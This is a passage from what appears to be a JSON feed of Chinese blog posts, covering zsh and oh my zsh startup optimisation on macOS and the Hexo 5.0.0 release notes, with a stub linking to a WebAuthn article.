Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">Hexo 5.0.0 正式发布</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-07-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]